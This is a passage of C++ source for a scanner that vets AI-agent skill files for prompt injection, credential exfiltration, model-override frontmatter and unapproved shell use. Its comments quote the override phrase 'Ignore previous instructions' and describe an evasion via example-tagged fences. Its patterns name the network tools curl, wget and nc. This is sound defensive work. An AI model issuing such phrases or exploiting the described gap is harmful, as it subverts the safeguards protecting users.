                inSpan = false;
            }
        }
        // Unclosed quote: do NOT treat as data.
    }

    return false;
}

// ── FRONTMATTER overreach: YAML keys attempting to set model/system/temperature (WARN) ──────────
//
// We are inside the YAML frontmatter block (between the two `---` delimiters) when these match.
// The scanner tracks frontmatter state.
struct FrontmatterPattern
{
    const char*  rule;
    RegexCompile re;
};

inline std::vector<FrontmatterPattern> buildFrontmatterPatterns()
{
    struct Row { const char* rule; const char* regexSrc; };
    static constexpr Row kRows[] = {
        { "FRONTMATTER:model-override",       R"(^\s*model\s*:)" },         // override the model at the harness level
        { "FRONTMATTER:system-override",      R"(^\s*system\s*:)" },        // inject a system prompt above the harness
        { "FRONTMATTER:temperature-override", R"(^\s*temperature\s*:)" },   // override inference parameters
    };
    std::vector<FrontmatterPattern> v;
    v.reserve( std::size( kRows ) );
    for( const Row& row : kRows )
    {
        v.push_back( { row.rule, compileGuardedRegex( row.regexSrc, kRegexEcmaScript ) } );
    }
    return v;
}

// ── SCOPE-CREEP: body references Bash/shell/network execution without it being allowed ──────────
//
// Strategy (conservative / precision-over-recall — false CRITICALs are worse than misses):
// 1. Parse `allowed-tools:` from frontmatter.
// 2. If Bash is NOT in allowed-tools AND the body contains shell execution indicators
//    (backtick-fenced or `$(...) ` or `curl/wget` outside a quoted example), flag WARN.
//
// We flag WARN (not CRITICAL) because scope-creep is a policy issue, not directly injective.
//
// Shell indicators in the body (outside frontmatter):
//   - Lines starting with ``` or ` that contain shell commands
//   - curl / wget appearing in what looks like an instruction (not in a ---fenced block)

static constexpr const char* kScopeCreepRule = "SCOPE-CREEP:bash-not-allowed";

// Parse the `allowed-tools:` line from the frontmatter portion (raw text, all lines).
// Returns the set of tool names mentioned (trimmed, no quotes).
inline std::vector<std::string> parseAllowedTools( const std::vector<std::string>& lines, int frontmatterEnd )
{
    std::vector<std::string> tools;
    for( int i = 0; i < frontmatterEnd && i < int( lines.size() ); ++i )
    {
        const std::string& ln = lines[i];
        // Match "allowed-tools: Bash, Read, ..." (or "allowed-tools: [Bash, Read]")
        const std::size_t pos = ln.find( "allowed-tools:" );
        if( pos == std::string::npos )
        {
            continue;
        }

        std::string rest = ln.substr( pos + 14 );   // after "allowed-tools:"
        // strip leading whitespace and optional [ ]
        std::size_t s = 0;
        while( s < rest.size() && ( rest[s] == ' ' || rest[s] == '\t' || rest[s] == '[' ) )
        {
            ++s;
        }
        std::size_t e = rest.size();
        while( e > s && ( rest[e - 1] == ' ' || rest[e - 1] == '\t' || rest[e - 1] == ']' || rest[e - 1] == '\r' || rest[e - 1] == '\n' ) )
        {
            --e;
        }
        rest = rest.substr( s, e - s );

        // comma-split
        std::istringstream ss( rest );
        std::string tok;
        while( std::getline( ss, tok, ',' ) )
        {
            std::size_t ts = 0, te = tok.size();
            while( ts < te && std::isspace( static_cast<unsigned char>( tok[ts] ) ) )
            {
                ++ts;
            }
            while( te > ts && std::isspace( static_cast<unsigned char>( tok[te - 1] ) ) )
            {
                --te;
            }
            if( ts < te )
            {
                tools.push_back( tok.substr( ts, te - ts ) );
            }
        }
        break;   // only the first allowed-tools: line matters
    }
    return tools;
}

inline bool toolAllowed( const std::vector<std::string>& tools, std::string_view name ) noexcept
{
    for( const std::string& t : tools )
    {
        if( std::string_view( t ) == name )
        {
            return true;
        }
    }
    return false;
}

// Is a fence-opening language tag (the text after ``` / ~~~) a purely EXAMPLE / data marker — not executable? An empty tag
// is a bare fence, NOT an example: its lines are live prose (see the fenced-block injection policy in scanSkillTextOn).
inline bool isExampleFenceLang( std::string_view tag ) noexcept
{
    // Normalise: strip leading/trailing whitespace.
    while( !tag.empty() && std::isspace( static_cast<unsigned char>( tag.front() ) ) )
    {
        tag.remove_prefix( 1 );
    }
    while( !tag.empty() && std::isspace( static_cast<unsigned char>( tag.back() ) ) )
    {
        tag.remove_suffix( 1 );
    }
    // Empty tag → bare fence → NOT an example fence (treat as live prose → injection may fire).
    if( tag.empty() )
    {
        return false;
    }
    // Recognised data/example markers.
    return tag == "text"    || tag == "example"  || tag == "output"
        || tag == "none"    || tag == "plain"    || tag == "raw"
        || tag == "markup"  || tag == "template";
}

// GE-SKILLSCAN: what the fence tracker says about ONE line, the two facts that steer scanSkillTextOn's body checks.
//   inFence         command context: relaxes the two exfil context gates (fenceOnly, requiresCmdContext)
//   inExampleFence  shown-as-data: the one fact that SUPPRESSES (injection, and the joined-body pass) — never set in a script
struct SkillLineFence
{
    bool inFence        = false;
    bool inExampleFence = false;
};

// GE-SKILLSCAN: the markdown fence tracker scanSkillTextOn walks the body with — which fenced block the scan is inside, changed
// only by its two named transitions (enterFence, leaveFence). readLine answers a line's membership as the state BEFORE its own marker toggles anything,
// so the lines BETWEEN the ``` markers read inFence, the opening marker reads false and the closing one true.
class SkillFenceTracker
{
public:
    // A shell script's line (SkillFileKind::ShellScript): code on every line, never an example — a ``` in a heredoc toggles nothing.
    static constexpr SkillLineFence kScriptLine{ /*inFence=*/true, /*inExampleFence=*/false };

    // The body line's fence membership, then the transition its ``` / ~~~ marker (after leading blanks) makes.
    SkillLineFence readLine( std::string_view line ) noexcept
    {
        const SkillLineFence membership = m_state;
        while( !line.empty() && ( line.front() == ' ' || line.front() == '\t' ) )
        {
            line.remove_prefix( 1 );
        }
        if( line.size() >= 3 && ( line.compare( 0, 3, "```" ) == 0 || line.compare( 0, 3, "~~~" ) == 0 ) )
        {
            if( !m_state.inFence )
            {
                enterFence( line.substr( 3 ) );
            }
            else
            {
                leaveFence();
            }
        }
        return membership;
    }

private:
    // Opening a new fence: its language tag (the text after the marker) decides example vs live.
    void enterFence( std::string_view langTag ) noexcept
    {
        m_state.inExampleFence = isExampleFenceLang( langTag );
        m_state.inFence        = true;
    }
    // Closing the current fence.
    void leaveFence() noexcept
    {
        m_state = SkillLineFence{};
    }

    SkillLineFence m_state;
};

// GE-SKILLSCAN: feed one body line to the whitespace-normalized joined-body INJECTION pass (A4-F12 §3). A phrase split across a
// newline ("Ignore previous\ninstructions") matches nothing in the per-line scan; the line's content, whitespace runs collapsed
// to one space and trimmed, joins `joinedBody` (space-separated), and `joinedLineOffsets` records where it starts so a cross-line
// match can be attributed back to a real line number. A line with no content adds nothing.
inline void appendJoinedBodyLine( std::string_view line, int lineNum, std::string& joinedBody, std::vector<std::pair<std::size_t, int>>& joinedLineOffsets )
{
    std::string normalized;
    normalized.reserve( line.size() );
    bool prevWasSpace = false;
    for( char c : line )
    {
        if( std::isspace( static_cast<unsigned char>( c ) ) )
        {
            if( !prevWasSpace && !normalized.empty() )
            {
                normalized += ' ';
            }
            prevWasSpace = true;
        }
        else
        {
            normalized += c;
            prevWasSpace = false;
        }
    }
    while( !normalized.empty() && normalized.back() == ' ' )
    {
        normalized.pop_back();
    }

    if( !normalized.empty() )
    {
        if( !joinedBody.empty() )
        {
            joinedBody += ' ';
        }
        joinedLineOffsets.push_back( { joinedBody.size(), lineNum } );
        joinedBody += normalized;
    }
}

// GE-SKILLSCAN: where one scanSkillTextOn call puts its findings, and the stack its regex searches run on.
struct SkillFindingSink
{
    std::vector<SkillFinding>& findings;
    std::size_t                stackBytes;

    // Add a finding with a clipped excerpt.
    void add( SkillSeverity sev, int lineNum, const char* rule, std::string_view lineText, const char* why = nullptr, NetExfilWhere where = {} )
    {
        findings.push_back( { sev, lineNum, rule, clipSkillExcerpt( lineText ), why, std::move( where.dest ), where.owner } );
    }

    // The regex boundary's answer as a plain hit, failing CLOSED on an undecided match — the line gets a CRITICAL
    // scan-incomplete finding (deduped per line in scanSkillTextOn), so an unscannable skill can never read "clean".
    // Exhausted (the engine gave up mid-match) and Skipped (the line was too long to hand the engine at all,
    // F-B3 / owner ruling 3) are both undecided and both fail closed — every line in a skill file IS installable
    // content, so there is no WARN tier here, only CRITICAL or a real answer.
    bool isHit( RegexVerdict verdict, int lineNum, std::string_view lineText )
    {
        if( verdict == RegexVerdict::Exhausted )
        {
            add( SkillSeverity::Critical, lineNum, kScanIncompleteRule, lineText );
        }
        else if( verdict == RegexVerdict::Skipped )
        {
            add( SkillSeverity::Critical, lineNum, kScanIncompleteRuleOversize, lineText );
        }
        return verdict == RegexVerdict::Hit;
    }
};

// GE-SKILLSCAN: one FRONTMATTER line — the first frontmatter pattern it matches (WARN), then its first INJECTION. The
// `description:` field is precisely the text harnesses inject into the agent's prompt — an injection phrase there is MORE
// dangerous than one in the body, not exempt. YAML double quotes are value syntax, not a shown-as-data marker, so only
// backtick spans suppress here.
inline void scanFrontmatterLine( SkillFindingSink& sink, const std::vector<FrontmatterPattern>& frontPats, const std::vector<InjectionPattern>& injPats,
                                 int lineNum, const std::string& ln )
{
    for( const FrontmatterPattern& p : frontPats )
    {
        if( sink.isHit( skillSearch( p.re, ln, sink.stackBytes ), lineNum, ln ) )
        {
            sink.add( SkillSeverity::Warn, lineNum, p.rule, ln );
            break;   // one finding per line per category
        }
    }
    for( const InjectionPattern& p : injPats )
    {
        RegexCaptures m;
        if( sink.isHit( skillSearch( p.re, ln, sink.stackBytes, &m ), lineNum, ln ) && !isShownAsData( ln, std::size_t( m.position( 0 ) ), /*quotesCountAsData=*/false ) )
        {
            sink.add( p.sev, lineNum, p.rule, ln );
            break;   // one INJECTION finding per line
        }
    }
}

// GE-SKILLSCAN: one live BODY line's INJECTION (case-insensitive literal) — a bare-prose imperative NOT fully enclosed in a
// balanced inline-code or double-quote span (isShownAsData requires a BALANCED enclosing span: open tick before pos + close
// tick after pos on the same line, not merely an odd count of preceding ticks/quotes). The first pattern that fires wins.
// The caller skips lines in an example-tagged fence (```text / ```example); a BARE or executable-language fence suppresses
// nothing — a phrase like "Ignore previous instructions" inside a bare ``` block is still prose the agent reads and acts on.
inline void scanBodyInjectionLine( SkillFindingSink& sink, const std::vector<InjectionPattern>& injPats, int lineNum, const std::string& ln )
{
    for( const InjectionPattern& p : injPats )
    {
        RegexCaptures m;
        if( sink.isHit( skillSearch( p.re, ln, sink.stackBytes, &m ), lineNum, ln ) && !isShownAsData( ln, std::size_t( m.position( 0 ) ) ) )
        {
            sink.add( p.sev, lineNum, p.rule, ln );
            break;   // one INJECTION finding per line (highest-priority match)
        }
    }
}

// GE-SKILLSCAN: one BODY line's first EXFILTRATE finding. requiresCmdContext patterns (api-key, cred paths) fire only with
// command context — a fenced run-block (`lineInFence`) or a co-occurring transmit verb; a bare prose mention of a credential is
// documentation. fenceOnly patterns (net-exfil) fire only inside a fenced code block — see buildExfilPatterns().
inline void scanBodyExfilLine( SkillFindingSink& sink, const std::vector<ExfilPattern>& exfilPats, const NetExfilContext& netCtx, const std::string& ln, bool lineInFence )
{
    const int lineNum = netCtx.line;
    for( const ExfilPattern& p : exfilPats )
    {
        // net-exfil: gradeNetExfil decides firing (a destination required, R1; a sensitive read into an upload
        // fires with or without the var-or-base64 shape, R2) and grade together — see there. A fence-only line outside a
        // fence is not graded at all: the row could not be kept.
        const bool          gradeIt  = p.isNetExfilShape && ( lineInFence || !p.fenceOnly );
        NetExfilGrade       netGrade = gradeIt ? gradeNetExfil( ln, netCtx ) : NetExfilGrade{};
        const bool matched = p.isNetExfilShape ? netGrade.fires : sink.isHit( skillSearch( p.re, ln, sink.stackBytes ), lineNum, ln );
        if( !matched )
        {
            continue;
        }
        if( p.fenceOnly && !lineInFence )
        {
            continue;
        }
        if( p.requiresCmdContext && !( lineInFence || sink.isHit( hasTransmitVerb( ln, sink.stackBytes ), lineNum, ln ) ) )
        {
            continue;
        }
        // #353: net-exfil's shape is a verb plus ANY var; only a credential-shaped source or a sensitive read into the
        // upload makes it CRITICAL (gradeNetExfil). Every other pattern here is CRITICAL as matched.
        sink.add( p.isNetExfilShape ? netGrade.sev : SkillSeverity::Critical, lineNum, p.rule, ln, p.isNetExfilShape ? netGrade.why : nullptr, std::move( netGrade.where ) );
        break;   // one EXFILTRATE finding per line
    }
}

// GE-SKILLSCAN: the SCOPE-CREEP check of one BODY line, for a skill whose allowed-tools are listed and leave Bash out (the
// caller decides that). Conservative: WARN, not CRITICAL, and only when the line looks like an actual shell command
// instruction — one of:
//   1. a fenced ```bash / ```sh / ```shell / ```zsh block header
//   2. a line starting with $ (interactive-shell style)
//   3. a line containing curl/wget/nc (network tools — likely a shell instruction)
inline void scanScopeCreepLine( SkillFindingSink& sink, int lineNum, const std::string& ln )
{
    const std::string_view lv = trimRight( ln );
    // ^…$ with a search is the whole-string match the old regex_match asked for: `lv` holds one line, no '\n'.
    static const RegexCompile kBashFenceRe = compileGuardedRegex( R"(^```\s*(bash|sh|shell|zsh)\s*$)", kRegexEcmaScript );
    static const RegexCompile kNetToolRe   = compileGuardedRegex( R"(\b(curl|wget|nc)\b)", kRegexEcmaScript );
    const bool isShellFence     = sink.isHit( skillSearch( kBashFenceRe, lv, sink.stackBytes ), lineNum, ln );
    const bool startsWithDollar = !lv.empty() && lv[0] == '$';
    const bool hasNetTool       = sink.isHit( skillSearch( kNetToolRe, lv, sink.stackBytes ), lineNum, ln );
    if( isShellFence || startsWithDollar || hasNetTool )
    {
        sink.add( SkillSeverity::Warn, lineNum, kScopeCreepRule, ln );
    }
}

}   // namespace detail

// F-B3 (owner ruling 3): a directory walk that gave up before every entry under it was visited, over content
// that WOULD BE INSTALLED — the caller (main.cpp's --scan-skills, wrap.h's wrapScanSkillDir) names this rule
// on a synthetic finding rather than reading a stopped walk as an honest "clean". Public (not detail::) because
// both those walks live outside this file.
static constexpr const char* kScanIncompleteRuleWalk = "SCAN-INCOMPLETE:walk-stopped-early";
// The same ruling for one FILE the walk found and scanSkillFileChecked could not read (mode 000 in an open folder,
// an I/O error, a descriptor limit): the file is still there to be copied, so the verdict is CRITICAL with this rule
// on a row naming it, never a skip that leaves the verdict "clean". A folder the walk cannot ENTER is different —
// its contents cannot be copied either — and stays WARN in wrap.h.
static constexpr const char* kScanIncompleteRuleUnreadable = "SCAN-INCOMPLETE:file-unreadable";

// ── core scanner ─────────────────────────────────────────────────────────────────────────────────

// The joined-body injection pass (below) searches windows of the joined body, never the whole of it: one skill's body
// is routinely tens of KB, past the engine's measured-safe subject on any stack (41,858 B for INJECTION:ignore-prev at
// 256 MiB under libstdc++, 1,225 B at 8 MiB), and a skipped body fails the whole skill CLOSED. Every INJECTION match is
// short once whitespace runs are collapsed to one space: kSkillInjectionSpanBytes, the longest being "ignore the
// previous instructions" (skillscanreadcheck.sh derives the span from buildInjectionPatterns' sources and fails when a
// pattern outgrows this constant). Windows overlap by more than that, so each match lies whole in one window. Windows
// start after, and end at, a space, so a cut never makes a \b where the text has none.
inline constexpr std::size_t kSkillJoinedWindowBytes  = 1024;
inline constexpr std::size_t kSkillJoinedOverlapBytes = 128;
inline constexpr std::size_t kSkillInjectionSpanBytes = 32;
static_assert( kSkillInjectionSpanBytes < kSkillJoinedOverlapBytes && kSkillJoinedOverlapBytes < kSkillJoinedWindowBytes,
               "a joined-body window overlap must exceed the longest INJECTION match, or a match across a window edge is lost" );
inline constexpr std::size_t kSkillScanStackBytes     = 256 * 1024 * 1024;   // the grep scan threads' size (search.h kGrepScanStackBytes)

// Sort findings (line, rule, severity WORST first) STABLY, then keep the first row per (line, rule): so a (line, rule) reported
// twice keeps its worst severity, and the earlier row on a tie. Keeping the first row after a non-stable sort on (line, rule)
// alone left the survivor to whatever the sort put first — a WARN could hide a CRITICAL and quiet the exit from 2 to 1.
// Today every rule's severity is a function of the line alone, so the severity key only ever breaks ties; it is the invariant,
// not a behaviour change, and the skillscan gate's dedupe arm holds it. Used by the per-line / joined-body dedupe in
// scanSkillTextOn and by mergeScriptPasses.
inline void dedupeFindingsKeepWorst( std::vector<SkillFinding>& findings )
{
    std::stable_sort( findings.begin(), findings.end(), []( const SkillFinding& a, const SkillFinding& b ) noexcept
                      {
                          if( a.line != b.line )
                          {
                              return a.line < b.line;
                          }
                          const int byRule = std::string_view( a.rule ).compare( b.rule );
                          return byRule != 0 ? byRule < 0 : a.sev > b.sev;
                      } );
    findings.erase( std::unique( findings.begin(), findings.end(), []( const SkillFinding& a, const SkillFinding& b ) noexcept
                                 { return a.line == b.line && std::string_view( a.rule ) == std::string_view( b.rule ); } ),
                    findings.end() );
}

// Scan the raw text of a skill markdown file line by line, on a thread settled at `stackBytes`. Findings are sorted
// (line, rule).
// `wholeFileIsCode` (a shell script, see SkillFileKind): there is no frontmatter, every line is command context and no
// ``` / ~~~ line toggles anything. It only ever sets lineInFence, which relaxes the two exfil context gates (fenceOnly, requiresCmdContext);
// lineInExampleFence, the one flag that SUPPRESSES (injection in an example fence), stays false. scanSkillText merges
// this pass with the markdown pass, so a script's findings are a superset of what the markdown reading alone reports.
inline std::vector<SkillFinding> scanSkillTextOn( std::string_view text, std::size_t stackBytes, bool wholeFileIsCode = false )
{
    using namespace detail;

    // Build regex patterns once per call (cheap for the sizes involved).
    const std::vector<ExfilPattern>       exfilPats  = buildExfilPatterns();
    const std::vector<FrontmatterPattern> frontPats  = buildFrontmatterPatterns();
    const std::vector<InjectionPattern>   injPats    = buildInjectionPatterns();

    std::vector<SkillFinding> findings;

    // Split into lines (retain line content for matching and excerpt extraction).
    std::vector<std::string> lines;
    {
        std::size_t start = 0;
        while( start <= text.size() )
        {
            const std::size_t nl = text.find( '\n', start );
            const std::size_t end = ( nl == std::string_view::npos ) ? text.size() : nl;
            lines.emplace_back( text.substr( start, end - start ) );
            start = end + 1;
        }
        // If the last character was '\n', we get an empty trailing entry — trim it.
        if( !lines.empty() && lines.back().empty() )
        {
            lines.pop_back();
        }
    }

    // ── frontmatter state: find the YAML block (first `---` to second `---`) ────────────────────
    // The code pass (a shell script) has NO frontmatter: bash runs a leading `---` line as a command and then every line
    // after it, so a YAML-shaped block there is code the pass must read (review M1: `---` / upload / `---` hid line 2).
    int frontmatterEnd = 0;   // index of the line AFTER the closing `---` (or 0 if none)
    if( !wholeFileIsCode )
    {
        bool inFront = false;
        for( int i = 0; i < int( lines.size() ); ++i )
        {
            const std::string_view ln = trimRight( lines[i] );
            if( i == 0 && ln == "---" ) { inFront = true; continue; }
            if( inFront && ln == "---" ) { frontmatterEnd = i + 1; break; }
        }
    }

    // Parse allowed-tools from frontmatter for scope-creep check.
    const std::vector<std::string> allowedTools = parseAllowedTools( lines, frontmatterEnd );
    const bool                      bashAllowed  = toolAllowed( allowedTools, "Bash" );

    // Every finding of this call goes through the sink: add() clips the excerpt, isHit() fails CLOSED on an undecided regex match.
    SkillFindingSink sink{ findings, stackBytes };
    // #353 flow: where the document binds each variable, read once. Only a curl line's destination consults it
    // (curlLineHosts), so a document without one skips the pass.
    const ShellBindings bindings = text.find( "curl" ) != std::string_view::npos ? collectShellBindings( lines ) : ShellBindings{};

    // ── fenced-block injection suppression policy ─────────────────────────────────────────────────
    //
    // A fenced code block with a recognised EXAMPLE language tag (text, example, output, none, plain, raw)
    // is treated as documentation data — injection phrases inside are suppressed (the author is SHOWING the
    // pattern, not issuing it).  Example: ```text\nIgnore previous instructions\n``` in docs.md.
    //
    // A BARE fence (no language tag, just ```) or an executable-language fence (bash, sh, python, …) is
    // treated as prose the agent will act on — injection phrases inside ARE flagged CRITICAL.  Rationale:
    // an attacker wrapping a bare ``\nIgnore…\n``` is still issuing an imperative; a bare fence does not
    // make the content inert.  A few false positives on contrived docs are acceptable; a missed real
    // injection is not.
    //
    // Residual evasion envelope: a fence tagged ```example or ```text that genuinely contains an injection
    // directive will be suppressed — an attacker who knows this can evade.  Tag-based suppression is still
    // better than the prior unconditional suppression of ALL fences.
    //
    // The `requiresCmdContext` EXFIL patterns already need the line to be in a fence (command context) to
    // fire — so EXFIL detection keeps its original lineInFence gate (commands in fences are real).
    // INJECTION detection uses `lineInExampleFence` for its suppression (not lineInFence).
    // detail::SkillFenceTracker carries the fence state across lines; detail::isExampleFenceLang reads an opening tag.

    // Accumulator for the whitespace-normalized joined-body INJECTION pass (A4-F12 §3): the body's
    // non-example-fence lines, whitespace-collapsed and space-joined, plus each line's start offset in the
    // joined buffer so a cross-line match can be attributed back to a real line number.
    std::string                              joinedBody;
    std::vector<std::pair<std::size_t,int>>  joinedLineOffsets;

    // ── scan each line ────────────────────────────────────────────────────────────────────────────
    SkillFenceTracker fences;
    for( int i = 0; i < int( lines.size() ); ++i )
    {
        const int          lineNum = i + 1;        // 1-based
        const std::string& ln      = lines[i];
        const bool         inFront = ( frontmatterEnd > 0 && i > 0 && i < frontmatterEnd );
        const bool         inBody  = !inFront && ( frontmatterEnd == 0 || i >= frontmatterEnd );

        // fenced-code membership of THIS line (SkillFenceTracker::readLine): none outside the body
        const SkillLineFence fence              = !inBody ? SkillLineFence{} : wholeFileIsCode ? SkillFenceTracker::kScriptLine : fences.readLine( ln );
        const bool           lineInFence        = fence.inFence;
        const bool           lineInExampleFence = fence.inExampleFence;

        if( inFront )
        {
            scanFrontmatterLine( sink, frontPats, injPats, lineNum, ln );   // ── FRONTMATTER checks, INJECTION in frontmatter
        }

        if( inBody )
        {
            if( !lineInExampleFence )
            {
                scanBodyInjectionLine( sink, injPats, lineNum, ln );   // ── INJECTION: suppressed only in an example-tagged fence
                // ── feed the whitespace-normalized joined-body pass (A4-F12 §3) — lines inside an example fence are
                // excluded here too, the same policy as the per-line scan just above.
                appendJoinedBodyLine( ln, lineNum, joinedBody, joinedLineOffsets );
            }
            scanBodyExfilLine( sink, exfilPats, NetExfilContext{ &bindings, lineNum }, ln, lineInFence );   // ── EXFILTRATE (regex)
            if( !bashAllowed && !allowedTools.empty() )
            {
                scanScopeCreepLine( sink, lineNum, ln );   // ── SCOPE-CREEP: Bash definitely not allowed
            }
        }
    }

    // ── second pass: whitespace-normalized joined body (A4-F12 §3) ───────────────────────────────
    // Catches an INJECTION phrase split across a newline ("Ignore previous\ninstructions"), which the
    // per-line scan above never sees since neither half-line matches on its own. `joinedBody` collapses all
    // whitespace runs (incl. newlines) to single spaces, so a phrase that was only broken by line-wrapping
    // now reads as one contiguous run. Only the FIRST occurrence per pattern is reported here (this pass
    // exists to catch the evasion, not to duplicate the exhaustive per-line scan); the (line, rule) dedupe
    // below collapses the case where the same instance was already found per-line.
    // Map a joined-body offset back to a real line number: the start of the joined-body run whose recorded offset is
    // the greatest one not exceeding `pos`. Honest fallback: line 0 if somehow no line offset was recorded (joinedBody
    // is built only from lines we did record, so this shouldn't happen, but a degrade-safe default beats an
    // out-of-range read).
    const auto joinedLineOf = [ & ]( std::size_t pos )
    {
        const auto it = std::upper_bound( joinedLineOffsets.begin(), joinedLineOffsets.end(), pos,
            []( std::size_t value, const std::pair<std::size_t,int>& entry ) noexcept { return value < entry.first; } );
        return it != joinedLineOffsets.begin() ? std::prev( it )->second : 0;
    };
    // The windows the pass searches, in order (kSkillJoinedWindowBytes above): each ends at a space (or the body's end)
    // and the next starts just after the FIRST space at or after end − kSkillJoinedOverlapBytes. A match crossing `end`
    // is at most kSkillInjectionSpanBytes long, so it starts at a word past end − kSkillInjectionSpanBytes whose
    // leading space is at or after end − kSkillJoinedOverlapBytes: the next window starts at or before it and holds it
    // whole. (Searching BACK from end − kSkillJoinedOverlapBytes found no space inside a long spaceless run and jumped
    // past `end`, missing a phrase that straddled it.) A run with no space
    // past a full window stretches the window to the next space instead of cutting a word; a window that ends up past
    // the engine's bound is Skipped and fails the skill closed, as a long line does.
    std::vector<std::pair<std::size_t, std::size_t>> joinedWindows;
    for( std::size_t begin = 0; begin < joinedBody.size(); )
    {
        std::size_t end = joinedBody.size();
        if( begin + kSkillJoinedWindowBytes < joinedBody.size() )
        {
            const std::size_t lastSpace = joinedBody.rfind( ' ', begin + kSkillJoinedWindowBytes );
            const std::size_t nextSpace = joinedBody.find( ' ', begin + kSkillJoinedWindowBytes );
            end = ( lastSpace != std::string::npos && lastSpace > begin + kSkillJoinedOverlapBytes ) ? lastSpace
                : ( nextSpace != std::string::npos )                                                 ? nextSpace
                                                                                                     : joinedBody.size();
        }
        joinedWindows.push_back( { begin, end } );
        if( end == joinedBody.size() )
        {
            break;
        }
        // `end` is a space here and end > begin + kSkillJoinedOverlapBytes, so the search finds one at or before `end`, past
        // `begin`: every window starts later than the one before it.
        begin = joinedBody.find( ' ', end - kSkillJoinedOverlapBytes ) + 1;
    }
    for( const InjectionPattern& p : injPats )
    {
        RegexCaptures m;
        RegexVerdict  verdict     = RegexVerdict::Miss;
        std::size_t   windowBegin = 0;
        for( const auto& [ wBegin, wEnd ] : joinedWindows )
        {
            windowBegin = wBegin;
            verdict     = skillSearch( p.re, std::string_view( joinedBody ).substr( wBegin, wEnd - wBegin ), stackBytes, &m );
            if( verdict != RegexVerdict::Miss )
            {
                break;   // the first hit (or the first undecided window) settles this pattern, as the unwindowed pass did
            }
        }
        if( verdict == RegexVerdict::Exhausted || verdict == RegexVerdict::Skipped )
        {
            // the joined window has no one line to blame: attribute the unscannable pass to the window's first line
            sink.add( SkillSeverity::Critical, joinedLineOf( windowBegin ),
                      verdict == RegexVerdict::Exhausted ? kScanIncompleteRule : kScanIncompleteRuleOversize,
                      "the whitespace-joined body (cross-line injection pass)" );
            continue;
        }
        if( verdict != RegexVerdict::Hit )
        {
            continue;
        }
        const std::size_t pos = windowBegin + std::size_t( m.position( 0 ) );
        if( isShownAsData( joinedBody, pos ) )
        {
            continue;
        }
        sink.add( p.sev, joinedLineOf( pos ), p.rule, m.str( 0 ) );
    }

    // ── sort by (line, rule, worst severity first) for deterministic output, then dedupe on (line, rule) ────────────────
    // The per-line pass and the joined-body pass can both find the SAME instance (e.g. a phrase that sits
    // entirely on one line is found per-line, then found again — same line, same rule — in the joined
    // buffer); collapse those to a single finding so output stays deterministic and non-redundant.
    dedupeFindingsKeepWorst( findings );

    return findings;
}

// What a file under a skill IS, for the fence gate (0.6.6). --scan-skills reads every regular file under a skill, and
// the markdown fence tracker used to run over a bundled script's bytes too: net-exfil, the one fence-only rule, never
// fired in scripts/helper.sh (no ``` line, so never "in a fence"), and a ``` pair in a heredoc could close a fence.
//   ShellScript — .sh .bash .zsh .ksh, or a first line `#!` (after a UTF-8 BOM) whose interpreter (through `env` or
//                 `busybox`) is sh, bash, zsh, dash, ksh, ash or mksh, or a shell startup file (.bashrc .bash_profile
//                 .bash_login .bash_logout .bash_aliases .zshrc .zshenv .zprofile .zlogin .profile .kshrc .envrc): also scanned as whole-file code (scanSkillTextOn's wholeFileIsCode), merged with the markdown pass.
//   OtherCode   — .py .js .mjs .cjs .jsx .ts .mts .cts .tsx .rb .pl .pm .lua .php .ps1 .psm1 .psd1 .bat .cmd, or any other `#!`: read exactly as before, but the scanner has no
//                 network-flow vocabulary for these languages (Python `requests.post` of `os.environ` is missed even in
//                 a ```python fence), so the answer DISCLOSES them: <skillscan code_not_flow_scanned="N">.
//   Markdown    — .md / .markdown whatever their first line says, and everything else: unchanged.
enum class SkillFileKind : std::uint8_t
{
    Markdown,
    ShellScript,
    OtherCode,
};

// A leading UTF-8 byte-order mark is not part of the file's first line for this probe: bash still runs such a file
// (review S2: `\xEF\xBB\xBF#!/bin/sh` executed, and read as markdown).
inline std::string_view skillTextAfterBom( std::string_view text ) noexcept
{
    return text.starts_with( "\xEF\xBB\xBF" ) ? text.substr( 3 ) : text;
}

// The interpreter a `#!` first line names, as a base name: `#!/bin/sh` -> sh, `#!/usr/bin/env -S bash -e` -> bash (through
// `env`, options and VAR=value operands are skipped, and `-u NAME` / `-C DIR` skip their argument too), `#!/bin/busybox sh`
// -> sh (the applet). Empty when the text has no `#!` line or it names nothing.
inline std::string_view skillShebangInterpreter( std::string_view text ) noexcept
{
    text = skillTextAfterBom( text );
    if( !text.starts_with( "#!" ) )
    {
        return {};
    }
    const std::size_t eol = text.find( '\n' );
    ASSUME( eol == std::string_view::npos || eol >= 2, "the text starts with \"#!\", so a newline is at index 2 or later" );
    std::string_view line     = text.substr( 2, eol == std::string_view::npos ? std::string_view::npos : eol - 2 );
    bool             afterEnv     = false;   // `env` (or `busybox`) seen: the interpreter is a later token
    bool             skipArgument = false;   // the previous token was an env option that takes an argument
    for( std::size_t start = line.find_first_not_of( " \t\r" ); start != std::string_view::npos; start = line.find_first_not_of( " \t\r" ) )
    {
        line.remove_prefix( start );
        const std::size_t      end   = line.find_first_of( " \t\r" );
        const std::string_view token = line.substr( 0, end );
        line.remove_prefix( token.size() );
        const std::string_view name = namesplit::afterLast( token, "/" );
        if( skipArgument )
        {
            skipArgument = false;
        }
        else if( !afterEnv && ( name == "env" || name == "busybox" ) )
        {
            afterEnv = true;
        }
        else if( afterEnv && ( token == "-u" || token == "-C" || token == "--unset" || token == "--chdir" ) )
        {
            skipArgument = true;
        }
        else if( !afterEnv || !( token.starts_with( "-" ) || token.find( '=' ) != std::string_view::npos ) )
        {
            return name;
        }
    }
    return {};
}

inline SkillFileKind skillFileKindOf( std::string_view path, std::string_view text ) noexcept
{
    // the extension: the base name's text after its last '.', lowercased (a dotfile `.bashrc` has none)
    const std::string_view base = namesplit::afterLast( path, "/" );
    const std::size_t      dot  = base.rfind( '.' );
    std::string            ext( ( dot == std::string_view::npos || dot == 0 ) ? std::string_view() : base.substr( dot + 1 ) );
    for( char& c : ext )
    {
        c = char( std::tolower( static_cast<unsigned char>( c ) ) );
    }
    const auto extIs = [ & ]( std::initializer_list<std::string_view> names ) noexcept
    {
        return std::find( names.begin(), names.end(), std::string_view( ext ) ) != names.end();
    };
    if( extIs( { "md", "markdown" } ) )
    {
        return SkillFileKind::Markdown;   // a markdown file is read as markdown whatever its first line says: .md is byte-identical
    }
    const std::string_view interpreter = skillShebangInterpreter( text );
    // shell startup files are shell code with no extension and usually no #! (review S3); direnv executes .envrc once allowed
    constexpr std::string_view kShellDotfiles[] = { ".bashrc", ".bash_profile", ".bash_login", ".bash_logout", ".bash_aliases", ".zshrc",
                                                    ".zshenv", ".zprofile", ".zlogin", ".profile", ".kshrc", ".envrc" };
